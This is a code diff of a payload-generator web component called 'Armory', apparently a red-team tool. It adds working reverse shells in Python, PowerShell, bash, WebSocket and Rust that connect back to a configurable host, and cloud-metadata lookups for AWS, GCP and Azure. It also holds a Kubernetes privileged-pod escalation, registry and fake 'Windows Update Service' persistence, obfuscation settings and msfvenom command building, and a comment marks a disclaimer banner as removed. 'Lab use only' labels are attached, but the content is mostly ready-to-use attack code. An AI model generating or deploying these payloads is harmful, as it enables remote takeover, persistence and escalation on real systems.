 Set-ItemProperty -Path $regPath -Name "LegitApp" -Value "C:\\Users\\Public\\payload.exe"
 
-# For SYSTEM persistence:
+# SYSTEM-level persistence:
 $regPath = "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-Set-ItemProperty -Path $regPath -Name "SystemApp" -Value "C:\\Windows\\Temp\\payload.exe"`
-      break
+Set-ItemProperty -Path $regPath -Name "SystemApp" -Value "C:\\Windows\\Temp\\payload.exe"
+
+# ⚠️ LAB USE ONLY — unauthorized use is illegal`;
+      break;
     }
     case 'service_persistence': {
-      rawCode = base + `# Service Persistence (PowerShell)
+      rawCode = base + `# Service Persistence — PowerShell
 $serviceName = "WindowsUpdateService"
 $binaryPath = "C:\\Windows\\Temp\\payload.exe"
 New-Service -Name $serviceName -BinaryPathName $binaryPath -DisplayName "Windows Update Service" -StartupType Automatic
 
 # Or using sc:
-sc create WindowsUpdateService binPath= "C:\\Windows\\Temp\\payload.exe" start= auto`
-      break
+sc create WindowsUpdateService binPath= "C:\\Windows\\Temp\\payload.exe" start= auto
+
+# ⚠️ LAB USE ONLY — unauthorized use is illegal`;
+      break;
+    }
+    case 'aws_ec2_reverse': {
+      rawCode = base + `#!/usr/bin/env python3
+# AWS EC2 Reverse Shell — Python
+import socket, subprocess, os, sys
+import requests
+
+def get_instance_metadata():
+    try:
+        r = requests.get('http://169.254.169.254/latest/meta-data/instance-id', timeout=2)
+        return r.text
+    except:
+        return 'unknown'
+
+def reverse_shell():
+    try:
+        instance_id = get_instance_metadata()
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(("${lhost}", ${lport}))
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        subprocess.call(["/bin/sh", "-i"])
+    except Exception as e:
+        sys.exit(1)
+
+if __name__ == "__main__":
+    reverse_shell()
+
+# ⚠️ LAB USE ONLY — unauthorized use is illegal`;
+      break;
+    }
+    case 'gcp_compute_reverse': {
+      rawCode = base + `#!/usr/bin/env python3
+# GCP Compute Reverse Shell — Python
+import socket, subprocess, os, sys
+import requests
+
+def get_instance_metadata():
+    try:
+        r = requests.get('http://metadata.google.internal/computeMetadata/v1/instance/id',
+                         headers={'Metadata-Flavor': 'Google'}, timeout=2)
+        return r.text
+    except:
+        return 'unknown'
+
+def reverse_shell():
+    try:
+        instance_id = get_instance_metadata()
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(("${lhost}", ${lport}))
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        subprocess.call(["/bin/sh", "-i"])
+    except Exception as e:
+        sys.exit(1)
+
+if __name__ == "__main__":
+    reverse_shell()
+
+# ⚠️ LAB USE ONLY — unauthorized use is illegal`;
+      break;
+    }
+    case 'azure_vm_reverse': {
+      rawCode = base + `# Azure VM Reverse Shell — PowerShell
+$imds = Invoke-RestMethod -Headers @{"Metadata"="true"} -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -Method Get
+$client = New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+};
+$client.Close()
+
+# ⚠️ LAB USE ONLY — unauthorized use is illegal`;
+      break;
+    }
+    case 'docker_reverse': {
+      rawCode = base + `#!/bin/bash
+# Docker Container Reverse Shell
+# Run inside a compromised container
+bash -i >& /dev/tcp/${lhost}/${lport} 0>&1
+
+# Alternative using Python (if bash /dev/tcp is unavailable):
+# python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# ⚠️ LAB USE ONLY — unauthorized use is illegal`;
+      break;
+    }
+    case 'kubernetes_exec': {
+      rawCode = base + `# Kubernetes Exec Shell
+# Get a shell in a pod:
+kubectl exec -it <pod-name> -- /bin/bash
+
+# If you have a compromised service account:
+kubectl auth can-i --list
+kubectl get pods
+kubectl exec -it <pod-name> -- /bin/sh
+
+# For privilege escalation, create a privileged pod:
+cat <<EOF | kubectl apply -f -
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privileged-pod
+spec:
+  containers:
+  - name: shell
+    image: alpine:latest
+    command: ["/bin/sh"]
+    args: ["-c", "sleep 3600"]
+    securityContext:
+      privileged: true
+  hostNetwork: true
+  hostPID: true
+EOF
+
+kubectl exec -it privileged-pod -- /bin/sh
+
+# ⚠️ LAB USE ONLY — unauthorized use is illegal`;
+      break;
+    }
+    case 'python_websocket_shell': {
+      rawCode = base + `#!/usr/bin/env python3
+# Python WebSocket Reverse Shell
+import asyncio
+import websockets
+import subprocess
+import os
+import sys
+
+async def ws_shell():
+    uri = f"ws://${lhost}:${lport}/shell"
+    try:
+        async with websockets.connect(uri) as websocket:
+            while True:
+                cmd = await websocket.recv()
+                if cmd == 'exit':
+                    break
+                try:
+                    out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+                    await websocket.send(out.decode())
+                except Exception as e:
+                    await websocket.send(str(e))
+    except Exception as e:
+        sys.exit(1)
+
+if __name__ == "__main__":
+    asyncio.run(ws_shell())
+
+# ⚠️ LAB USE ONLY — unauthorized use is illegal`;
+      break;
+    }
+    case 'rust_reverse': {
+      rawCode = base + `// Rust Reverse Shell
+use std::net::TcpStream;
+use std::os::unix::io::AsRawFd;
+use std::process::{Command, Stdio};
+use std::thread;
+use std::time::Duration;
+
+fn main() {
+    loop {
+        if let Ok(stream) = TcpStream::connect("${lhost}:${lport}") {
+            let fd = stream.as_raw_fd();
+            let _ = Command::new("/bin/sh")
+                .stdin(Stdio::from_raw_fd(fd))
+                .stdout(Stdio::from_raw_fd(fd))
+                .stderr(Stdio::from_raw_fd(fd))
+                .status();
+        }
+        thread::sleep(Duration::from_secs(5));
+    }
+}
+
+// Compile with: rustc -C opt-level=3 -C lto=true -C target-feature=+crt-static reverse.rs
+// Cross-compile: cargo build --target x86_64-unknown-linux-musl --release
+
+// ⚠️ LAB USE ONLY — unauthorized use is illegal`;
+      break;
     }
     default:
-      rawCode = base + `// ${type} payload not yet implemented`
+      rawCode = base + `// ${type} payload not yet implemented`;
   }
 
-  return obfuscateCode(rawCode, format, obfuscation)
+  return obfuscateCode(rawCode, format, obfuscation);
 }
 
 // ─── Main Component ───────────────────────────────────────
-export default function PayloadForge() {
-  const [activeTab, setActiveTab] = useState<'generator' | 'encyclopedia'>('encyclopedia')
-  const [selectedPayload, setSelectedPayload] = useState<PayloadType>('reverse_shell')
-  const [format, setFormat] = useState<OutputFormat>('python')
-  const [lhost, setLhost] = useState('10.10.14.5')
-  const [lport, setLport] = useState(4444)
-  const [obfuscation, setObfuscation] = useState<ObfuscationLevel>('medium')
-  const [generatedPayload, setGeneratedPayload] = useState('')
-  const [showRaw, setShowRaw] = useState(false)
-  const [expandedPayloads, setExpandedPayloads] = useState<Set<PayloadType>>(new Set())
-  const [copyStatus, setCopyStatus] = useState<'idle' | 'success' | 'error' | 'manual'>('idle')
-  const [lhostError, setLhostError] = useState<string | null>(null)
-  const [lportError, setLportError] = useState<string | null>(null)
-  const [showPayloadInfo, setShowPayloadInfo] = useState(true)
-  
-  const currentPayloadInfo = PAYLOAD_BY_TYPE[selectedPayload]
-  
-  const saveTimeoutRef = useRef<TimerHandle | null>(null)
-  const copyTimerRef = useRef<TimerHandle | null>(null)
-  const manualCopyRef = useRef<HTMLPreElement>(null)
-  const initRef = useRef(false)
+export default function Armory() {
+  const [activeTab, setActiveTab] = useState<'generator' | 'encyclopedia'>('generator');
+  const [selectedPayload, setSelectedPayload] = useState<PayloadType>('reverse_shell');
+  const [format, setFormat] = useState<OutputFormat>('python');
+  const [lhost, setLhost] = useState('10.10.14.5');
+  const [lport, setLport] = useState(4444);
+  const [obfuscation, setObfuscation] = useState<ObfuscationLevel>('none');
+  const [generatedPayload, setGeneratedPayload] = useState('');
+  const [showRaw, setShowRaw] = useState(false);
+  const [expandedPayloads, setExpandedPayloads] = useState<Set<PayloadType>>(new Set());
+  const [copyStatus, setCopyStatus] = useState<'idle' | 'success' | 'error' | 'manual'>('idle');
+  const [lhostError, setLhostError] = useState<string | null>(null);
+  const [lportError, setLportError] = useState<string | null>(null);
+  const [showPayloadInfo, setShowPayloadInfo] = useState(true);
+  const [encyclopediaSearch, setEncyclopediaSearch] = useState('');
+  const [autoGenerate, setAutoGenerate] = useState(true);
+  const [history, setHistory] = useState<HistoryEntry[]>([]);
+  const [listenerCopyOk, setListenerCopyOk] = useState(false);
 
-  // Load config from localStorage ONCE (mount only)
+  const currentPayloadInfo = PAYLOAD_BY_TYPE[selectedPayload];
+
+  const saveTimeoutRef = useRef<TimerHandle | null>(null);
+  const copyTimerRef = useRef<TimerHandle | null>(null);
+  const manualCopyRef = useRef<HTMLPreElement>(null);
+  const initRef = useRef(false);
+
+  // Load config from localStorage ONCE
   useEffect(() => {
-    if (initRef.current) return
-    initRef.current = true
-    
+    if (initRef.current) return;
+    initRef.current = true;
+
     type SavedConfig = {
-      lhost?: unknown
-      lport?: unknown
-      selectedPayload?: unknown
-      format?: unknown
-      obfuscation?: unknown
-    }
+      lhost?: unknown;
+      lport?: unknown;
+      selectedPayload?: unknown;
+      format?: unknown;
+      obfuscation?: unknown;
+    };
 
     const isPayloadType = (value: unknown): value is PayloadType =>
-      typeof value === 'string' && value in PAYLOAD_BY_TYPE
+      typeof value === 'string' && value in PAYLOAD_BY_TYPE;
 
     const isOutputFormat = (value: unknown): value is OutputFormat =>
       typeof value === 'string' && [
-        'powershell','csharp','python','go','raw_c','vba','javascript',
-        'php','jsp','aspx','bash','perl','ruby','batch','hta','xml','inf'
-      ].includes(value)
+        'powershell', 'csharp', 'python', 'go', 'raw_c', 'vba', 'javascript',
+        'php', 'jsp', 'aspx', 'bash', 'perl', 'ruby', 'batch', 'hta', 'xml', 'inf', 'rust'
+      ].includes(value);
 
     const isObfuscationLevel = (value: unknown): value is ObfuscationLevel =>
-      typeof value === 'string' && ['none','light','medium','heavy'].includes(value)
+      typeof value === 'string' && ['none', 'light', 'medium', 'heavy'].includes(value);
 
-    const saved = localStorage.getItem(STORAGE_KEY)
-    if (!saved) return
-    
+    const saved = localStorage.getItem(STORAGE_KEY);
+    if (!saved) return;
+
     try {
-      const config = JSON.parse(saved) as SavedConfig
-      
-      if (typeof config.lhost === 'string') setLhost(config.lhost)
+      const config = JSON.parse(saved) as SavedConfig;
+
+      if (typeof config.lhost === 'string') setLhost(config.lhost);
       if (typeof config.lport === 'number' && config.lport >= 1 && config.lport <= 65535) {
-        setLport(config.lport)
+        setLport(config.lport);
       }
 
-      const selectedPayloadValue = config.selectedPayload
-      const hasValidPayload = isPayloadType(selectedPayloadValue)
+      const selectedPayloadValue = config.selectedPayload;
+      const hasValidPayload = isPayloadType(selectedPayloadValue);
       if (hasValidPayload) {
-        setSelectedPayload(selectedPayloadValue)
+        setSelectedPayload(selectedPayloadValue);
       }
-      
+
       const payload = hasValidPayload
         ? PAYLOAD_BY_TYPE[selectedPayloadValue]
-        : PAYLOAD_BY_TYPE[selectedPayload]
+        : PAYLOAD_BY_TYPE[selectedPayload];
 
       if (isOutputFormat(config.format) && payload.supportedFormats.includes(config.format)) {
-        setFormat(config.format)
+        setFormat(config.format);
       } else if (payload.supportedFormats.length > 0) {
-        setFormat(payload.supportedFormats[0])
+        setFormat(payload.supportedFormats[0]);
       }
-      
-      if (isObfuscationLevel(config.obfuscation)) setObfuscation(config.obfuscation)
+
+      if (isObfuscationLevel(config.obfuscation)) setObfuscation(config.obfuscation);
     } catch (err) {
-      console.error('payloadforge_config: failed to parse saved config:', err)
+      console.error('payloadforge_config: failed to parse saved config:', err);
     }
-  }, [])
+  }, []);
 
   // Debounced save to localStorage
   useEffect(() => {
-    if (!initRef.current) return
-    
+    if (!initRef.current) return;
+
     if (saveTimeoutRef.current) {
-      clearTimeout(saveTimeoutRef.current)
+      clearTimeout(saveTimeoutRef.current);
     }
-    
+
     saveTimeoutRef.current = setTimeout(() => {
       try {
-        localStorage.setItem(STORAGE_KEY, JSON.stringify({ 
-          lhost, 
-          lport, 
-          selectedPayload, 
+        localStorage.setItem(STORAGE_KEY, JSON.stringify({
+          lhost,
+          lport,
+          selectedPayload,
           format,
           obfuscation
-        }))
+        }));
       } catch (err) {
         if (err instanceof DOMException && err.name === 'QuotaExceededError') {
-          console.error('payloadforge_config: localStorage quota exceeded')
+          console.error('payloadforge_config: localStorage quota exceeded');
         } else {
-          console.error('payloadforge_config: save failed', err)
+          console.error('payloadforge_config: save failed', err);
         }
       }
-    }, 500)
-    
+    }, 500);
+
     return () => {
       if (saveTimeoutRef.current) {
-        clearTimeout(saveTimeoutRef.current)
+        clearTimeout(saveTimeoutRef.current);
       }
-    }
-  }, [lhost, lport, selectedPayload, format, obfuscation])
+    };
+  }, [lhost, lport, selectedPayload, format, obfuscation]);
 
   const handlePayloadChange = (newType: PayloadType) => {
-    setSelectedPayload(newType)
-    const info = PAYLOAD_BY_TYPE[newType]
+    setSelectedPayload(newType);
+    const info = PAYLOAD_BY_TYPE[newType];
     if (info) {
-      if (info.requiresLport) setLport(info.defaultPort)
+      if (info.requiresLport) setLport(info.defaultPort);
       if (!info.supportedFormats.includes(format)) {
-        setFormat(info.supportedFormats[0])
+        setFormat(info.supportedFormats[0]);
       }
     }
-  }
+  };
 
   const handleLportChange = (value: string) => {
     if (value === '') {
-      setLportError(null)
-      return
+      setLportError(null);
+      return;
     }
-    const parsed = parseInt(value, 10)
+    const parsed = parseInt(value, 10);
     if (isNaN(parsed)) {
-      setLportError('Invalid port number')
-      return
+      setLportError('Invalid port number');
+      return;
     }
     if (parsed < 1 || parsed > 65535) {
-      setLportError('Port must be 1-65535')
-      return
+      setLportError('Port must be 1-65535');
+      return;
     }
-    setLport(parsed)
-    setLportError(null)
-  }
+    setLport(parsed);
+    setLportError(null);
+  };
 
   const handleLhostChange = (value: string) => {
-    const trimmed = value.trim()
+    const trimmed = value.trim();
     if (trimmed === '') {
-      setLhostError(null)
-      return
+      setLhostError(null);
+      return;
     }
-    
+
     if (trimmed === 'localhost') {
-      setLhost(trimmed)
-      setLhostError(null)
-      return
+      setLhost(trimmed);
+      setLhostError(null);
+      return;
     }
-    
-    const ipv4Match = trimmed.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/)
+
+    const ipv4Match = trimmed.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
     if (ipv4Match) {
-      const octets = [ipv4Match[1], ipv4Match[2], ipv4Match[3], ipv4Match[4]].map(Number)
+      const octets = [ipv4Match[1], ipv4Match[2], ipv4Match[3], ipv4Match[4]].map(Number);
       if (octets.every(o => o >= 0 && o <= 255)) {
-        setLhost(trimmed)
-        setLhostError(null)
-        return
+        setLhost(trimmed);
+        setLhostError(null);
+        return;
       }
-      setLhostError(`Invalid IPv4: "${trimmed}" — octets must be 0-255`)
-      return
+      setLhostError(`Invalid IPv4: "${trimmed}" — octets must be 0-255`);
+      return;
     }
-    
+
     if (trimmed.includes(':') && !/\s/.test(trimmed) && /^[0-9a-fA-F:]+$/.test(trimmed)) {
-      setLhost(trimmed)
-      setLhostError(null)
-      return
+      setLhost(trimmed);
+      setLhostError(null);
+      return;
     }
-    
+
     if (/^[a-zA-Z0-9]([a-zA-Z0-9_-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9_-]{0,61}[a-zA-Z0-9])?)*$/.test(trimmed)) {
-      setLhost(trimmed)
-      setLhostError(null)
-      return
+      setLhost(trimmed);
+      setLhostError(null);
+      return;
     }
-    
-    setLhostError(`Invalid LHOST: "${trimmed}" — use IPv4 (10.0.0.1), IPv6, or hostname`)
-  }
+
+    setLhostError(`Invalid LHOST: "${trimmed}" — use IPv4 (10.0.0.1), IPv6, or hostname`);
+  };
 
   const copyToClipboard = async (text: string) => {
     if (copyTimerRef.current) {
-      clearTimeout(copyTimerRef.current)
-      copyTimerRef.current = null
+      clearTimeout(copyTimerRef.current);
+      copyTimerRef.current = null;
     }
-    
+
     try {
-      await navigator.clipboard.writeText(text)
-      setCopyStatus('success')
-      copyTimerRef.current = setTimeout(() => setCopyStatus('idle'), 2000)
+      await navigator.clipboard.writeText(text);
+      setCopyStatus('success');
+      copyTimerRef.current = setTimeout(() => setCopyStatus('idle'), 2000);
     } catch (e) {
-      const textarea = document.createElement('textarea')
-      textarea.value = text
-      textarea.style.position = 'fixed'
-      textarea.style.opacity = '0'
-      textarea.style.left = '-9999px'
-      document.body.appendChild(textarea)
-      textarea.focus()
-      textarea.select()
-      let succeeded = false
+      const textarea = document.createElement('textarea');
+      textarea.value = text;
+      textarea.style.position = 'fixed';
+      textarea.style.opacity = '0';
+      textarea.style.left = '-9999px';
+      document.body.appendChild(textarea);
+      textarea.focus();
+      textarea.select();
+      let succeeded = false;
       try {
-        succeeded = document.execCommand('copy')
-      } catch {}
-      document.body.removeChild(textarea)
-      
+        succeeded = document.execCommand('copy');
+      } catch { }
+      document.body.removeChild(textarea);
+
       if (!succeeded) {
-        setCopyStatus('manual')
-        return
+        setCopyStatus('manual');
+        return;
       } else {
-        setCopyStatus('success')
-        copyTimerRef.current = setTimeout(() => setCopyStatus('idle'), 2000)
+        setCopyStatus('success');
+        copyTimerRef.current = setTimeout(() => setCopyStatus('idle'), 2000);
       }
     }
-  }
+  };
 
   const downloadPayload = () => {
-    if (!generatedPayload) return
-    const mimeType = FORMAT_MIMES[format] ?? 'application/octet-stream'
-    const blob = new Blob([generatedPayload], { type: mimeType })
-    const url = URL.createObjectURL(blob)
-    const a = document.createElement('a')
-    a.href = url
-    const ext = FORMAT_EXTENSIONS[format] || 'txt'
-    a.download = `${selectedPayload}_${format}.${ext}`
-    a.click()
-    URL.revokeObjectURL(url)
-  }
+    if (!generatedPayload) return;
+    const mimeType = FORMAT_MIMES[format] ?? 'application/octet-stream';
+    const blob = new Blob([generatedPayload], { type: mimeType });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    const ext = FORMAT_EXTENSIONS[format] || 'txt';
+    a.download = `${selectedPayload}_${format}.${ext}`;
+    a.click();
+    URL.revokeObjectURL(url);
+  };
 
   const generate = () => {
     if (currentPayloadInfo.requiresLhost && lhost.trim() === '') {
-      setLhostError('LHOST is required for this payload')
-      return
+      setLhostError('LHOST is required for this payload');
+      return;
     }
     if (currentPayloadInfo.requiresLport && (lport < 1 || lport > 65535)) {
-      setLportError('Valid port (1-65535) is required')
-      return
+      setLportError('Valid port (1-65535) is required');
+      return;
     }
-    const payload = generatePayloadCode(selectedPayload, format, lhost, lport, obfuscation)
-    setGeneratedPayload(payload)
-  }
+    if (lhostError || lportError) return;
+    const payload = generatePayloadCode(selectedPayload, format, lhost, lport, obfuscation);
+    setGeneratedPayload(payload);
+    setHistory(prev => {
+      const entry: HistoryEntry = {
+        id: `${Date.now()}`,
+        at: Date.now(),
+        type: selectedPayload,
+        format,
+        lhost,
+        lport,
+        snippet: payload.slice(0, 160).replace(/\s+/g, ' '),
+      };
+      return [entry, ...prev].slice(0, 12);
+    });
+  };
+
+  // Auto-regenerate
+  useEffect(() => {
+    if (!autoGenerate || !initRef.current) return;
+    if (currentPayloadInfo.requiresLhost && !lhost.trim()) return;
+    if (currentPayloadInfo.requiresLport && (lport < 1 || lport > 65535)) return;
+    if (lhostError || lportError) return;
+    const t = setTimeout(() => {
+      const payload = generatePayloadCode(selectedPayload, format, lhost, lport, obfuscation);
+      setGeneratedPayload(payload);
+    }, 350);
+    return () => clearTimeout(t);
+  }, [selectedPayload, format, lhost, lport, obfuscation, autoGenerate, currentPayloadInfo, lhostError, lportError]);
+
+  const msfvenomCmd = useMemo(
+    () => buildMsfvenomCommand(selectedPayload, format, lhost, lport),
+    [selectedPayload, format, lhost, lport]
+  );
+
+  const copyListener = async () => {
+    const cmd = substituteListener(currentPayloadInfo.commonListenerCommand, lhost, lport);
+    try {
+      await navigator.clipboard.writeText(cmd);
+      setListenerCopyOk(true);
+      setTimeout(() => setListenerCopyOk(false), 1500);
+    } catch {
+      window.prompt('Copy listener command:', cmd);
+    }
+  };
 
   const handleSelectAll = () => {
-    if (!manualCopyRef.current) return
-    const range = document.createRange()
-    range.selectNodeContents(manualCopyRef.current)
-    const sel = window.getSelection()
-    sel?.removeAllRanges()
-    sel?.addRange(range)
-  }
+    if (!manualCopyRef.current) return;
+    const range = document.createRange();
+    range.selectNodeContents(manualCopyRef.current);
+    const sel = window.getSelection();
+    sel?.removeAllRanges();
+    sel?.addRange(range);
+  };
 
   useEffect(() => {
     if (copyStatus === 'manual' && manualCopyRef.current) {
-      handleSelectAll()
-      manualCopyRef.current.focus()
+      handleSelectAll();
+      manualCopyRef.current.focus();
     }
-  }, [copyStatus])
+  }, [copyStatus]);
 
   const toggleExpand = (type: PayloadType) => {
     setExpandedPayloads(prev => {
-      const next = new Set(prev)
+      const next = new Set(prev);
       if (next.has(type)) {
-        next.delete(type)
+        next.delete(type);
       } else {
-        next.add(type)
+        next.add(type);
         if (next.size > 10) {
-          const first = next.values().next().value
+          const first = next.values().next().value;
           if (first !== undefined) {
-            next.delete(first)
+            next.delete(first);
           }
         }
       }
-      return next
-    })
-  }
+      return next;
+    });
+  };
 
   const payloadCategories = useMemo(() => {
-    const groups: Record<string, PayloadInfo[]> = {}
+    const groups: Record<string, PayloadInfo[]> = {};
     PAYLOAD_ENCYCLOPEDIA.forEach(p => {
-      if (!groups[p.category]) groups[p.category] = []
-      groups[p.category].push(p)
-    })
-    return groups
-  }, [])
+      if (!groups[p.category]) groups[p.category] = [];
+      groups[p.category].push(p);
+    });
+    return groups;
+  }, []);
 
-  const inputClass = "w-full bg-black/30 border border-white/10 rounded-xl px-4 py-2.5 text-sm font-mono text-white/80 focus:outline-none focus:border-red-500/30 placeholder-white/20"
-  const selectClass = "w-full bg-black/30 border border-white/10 rounded-xl px-4 py-2.5 text-sm text-white/80 focus:outline-none focus:border-red-500/30"
+  const filteredEncyclopedia = useMemo(() => {
+    const q = encyclopediaSearch.trim().toLowerCase();
+    if (!q) return PAYLOAD_ENCYCLOPEDIA;
+    return PAYLOAD_ENCYCLOPEDIA.filter(p =>
+      p.name.toLowerCase().includes(q) ||
+      p.category.toLowerCase().includes(q) ||
+      p.description.toLowerCase().includes(q) ||
+      p.type.toLowerCase().includes(q) ||
+      p.whereToUse.toLowerCase().includes(q)
+    );
+  }, [encyclopediaSearch]);
+
+  const inputClass = "w-full bg-black/40 border border-white/10 rounded-xl px-4 py-2.5 text-sm font-mono text-white/80 focus:outline-none focus:border-red-500/40 placeholder-white/20 transition-colors";
+  const selectClass = "w-full bg-black/40 border border-white/10 rounded-xl px-4 py-2.5 text-sm text-white/80 focus:outline-none focus:border-red-500/40 transition-colors [&>option]:bg-[#0d1022]";
+
+  const getStealthBadge = (rating: string) => {
+    const colors = {
+      Low: 'bg-red-500/20 text-red-400 border-red-500/30',
+      Medium: 'bg-yellow-500/20 text-yellow-400 border-yellow-500/30',
+      High: 'bg-emerald-500/20 text-emerald-400 border-emerald-500/30',
+    };
+    return colors[rating as keyof typeof colors] || colors.Low;
+  };
 
   return (
-    <div className="min-h-full overflow-y-auto" style={{ background: 'linear-gradient(135deg, #090b14 0%, #0d1022 50%, #090b14 100%)' }}>
-      
+    <div className="min-h-full overflow-y-auto" style={{ background: 'linear-gradient(145deg, #080b1a 0%, #0d1225 40%, #0a0d1e 100%)' }}>
+
       {/* ── Header ── */}
-      <div className="flex items-center justify-between px-8 py-4 border-b border-white/5 flex-wrap gap-2">
+      <div className="flex items-center justify-between px-6 py-4 border-b border-white/5 flex-wrap gap-2 sticky top-0 z-10 backdrop-blur-xl bg-[#0d1225]/80">
         <div className="flex items-center gap-3">
-          <div className="w-9 h-9 rounded-xl flex items-center justify-center border border-red-500/20" style={{ background: 'radial-gradient(circle, rgba(239,68,68,0.18), rgba(239,68,68,0.04))' }}>
-            <Swords size={16} className="text-red-400" />
+          <div className="w-10 h-10 rounded-xl flex items-center justify-center border border-red-500/30 shadow-lg shadow-red-500/10" style={{ background: 'radial-gradient(circle, rgba(239,68,68,0.2), rgba(239,68,68,0.05))' }}>
+            <Swords size={18} className="text-red-400" />
           </div>
           <div>
-            <span className="text-white font-bold text-base">Armory</span>
-            <div className="text-white/40 text-xs">Generate + Understand Red Team Payloads</div>
+            <span className="text-white font-bold text-base tracking-tight">Armory</span>
+            <div className="text-white/35 text-[10px] flex items-center gap-2">
+              <span>Lab study · authorized testing reference</span>
+              <span className="w-1 h-1 rounded-full bg-white/20" />
+              <span className="text-amber-400/60">44 payloads</span>
+            </div>
           </div>
         </div>
-        <div className="flex gap-2">
+        <div className="flex gap-2 items-center flex-wrap">
           <div className="flex bg-white/5 border border-white/10 rounded-xl p-0.5">
             <button
               onClick={() => setActiveTab('encyclopedia')}
-              className={`px-4 py-1.5 rounded-lg flex items-center gap-1.5 text-xs font-medium transition-all ${
-                activeTab === 'encyclopedia' 
-                  ? 'bg-red-500/20 text-red-400 border border-red-500/30' 
+              className={`px-4 py-1.5 rounded-lg flex items-center gap-1.5 text-xs font-medium transition-all ${activeTab === 'encyclopedia'
+                  ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                   : 'text-white/40 hover:text-white/80'
-              }`}
+                }`}
             >
-              <BookOpen size={12} /> Encyclopedia ({PAYLOAD_ENCYCLOPEDIA.length})
+              <BookOpen size={12} /> Encyclopedia
             </button>
             <button
               onClick={() => setActiveTab('generator')}
-              className={`px-4 py-1.5 rounded-lg flex items-center gap-1.5 text-xs font-medium transition-all ${
-                activeTab === 'generator' 
-                  ? 'bg-red-500/20 text-red-400 border border-red-500/30' 
+              className={`px-4 py-1.5 rounded-lg flex items-center gap-1.5 text-xs font-medium transition-all ${activeTab === 'generator'
+                  ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                   : 'text-white/40 hover:text-white/80'
-              }`}
+                }`}
             >
               <Zap size={12} /> Generator
             </button>
@@ -2525,139 +3696,122 @@ export default function PayloadForge() {
         </div>
       </div>
 
-      {/* ── Main Content ── */}
-      <div className="px-8 py-6 max-w-7xl mx-auto">
+      {/* ── Removed Disclaimer Banner ── */}
 
-        {/* PAYLOAD INFO SECTION - Collapsible */}
-        <div className="mb-6">
+      {/* ── Main Content ── */}
+      <div className="px-6 py-5 max-w-7xl mx-auto">
+
+        {/* Educational overview */}
+        <div className="mb-5">
           <button
             onClick={() => setShowPayloadInfo(!showPayloadInfo)}
-            className="w-full flex items-center justify-between bg-red-500/5 border border-red-500/20 rounded-2xl px-6 py-4 hover:bg-red-500/10 transition-all group"
+            className="w-full flex items-center justify-between bg-white/5 border border-white/10 rounded-2xl px-5 py-3.5 hover:bg-white/[0.07] transition-all group"
           >
             <div className="flex items-center gap-3">
-              <div className="p-2 rounded-xl bg-red-500/20 text-red-400 group-hover:scale-110 transition-transform">
-                <Swords size={18} />
+              <div className="p-2 rounded-xl bg-cyan-500/15 text-cyan-400 group-hover:scale-105 transition-transform">
+                <GraduationCap size={18} />
               </div>
               <div className="text-left">
-                <span className="text-red-400 font-bold text-sm">What is a Payload?</span>
+                <span className="text-white font-bold text-sm">Lab Context & Concepts</span>
                 <span className="text-white/30 text-xs ml-3 hidden sm:inline">
-                  {showPayloadInfo ? 'Click to collapse' : 'Click to expand'} — Essential knowledge for every hacker
+                  {showPayloadInfo ? 'Collapse' : 'Expand'} — understand payloads in lab vs real-world
                 </span>
               </div>
             </div>
-            <div className="text-white/30 group-hover:text-red-400 transition-colors">
+            <div className="text-white/30 group-hover:text-cyan-400 transition-colors">
               {showPayloadInfo ? <ChevronUp size={20} /> : <ChevronDown size={20} />}
             </div>
           </button>
-          
+
           {showPayloadInfo && (
-            <div className="bg-white/5 border border-red-500/20 border-t-0 rounded-b-2xl p-6 space-y-4 text-xs text-white/70 leading-relaxed">
-              <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
+            <div className="bg-white/5 border border-white/10 border-t-0 rounded-b-2xl p-5 space-y-4 text-xs text-white/70 leading-relaxed animate-slideDown">
+              <div className="grid grid-cols-1 lg:grid-cols-3 gap-5">
                 <div className="space-y-3">
                   <div className="flex items-center gap-2">
-                    <div className="w-1 h-8 bg-red-500 rounded-full"></div>
-                    <h3 className="text-red-400 font-bold text-sm">What is a Payload?</h3>
+                    <div className="w-1 h-8 bg-cyan-400 rounded-full" />
+                    <h3 className="text-cyan-400 font-bold text-sm">What is a Payload?</h3>
                   </div>
                   <p className="text-white/50 pl-3">
-                    In cybersecurity, a <span className="text-red-400 font-semibold">payload</span> is the component of a malicious 
-                    program or exploit that performs the actual harmful action. It's the "cargo" delivered by an exploit's delivery 
-                    mechanism (the "vector").
+                    In security training, a <span className="text-white font-semibold">payload</span> is the code that runs
+                    after access is obtained — e.g., a shell session in a lab VM. Understanding categories helps you
+                    <span className="text-white"> detect and defend</span> as much as it helps authorized testers.
                   </p>
-                  <div className="bg-black/30 border border-white/5 rounded-xl p-3 mt-2">
+                  <div className="bg-black/30 border border-white/5 rounded-xl p-3 mt-1">
                     <code className="text-xs text-cyan-400">
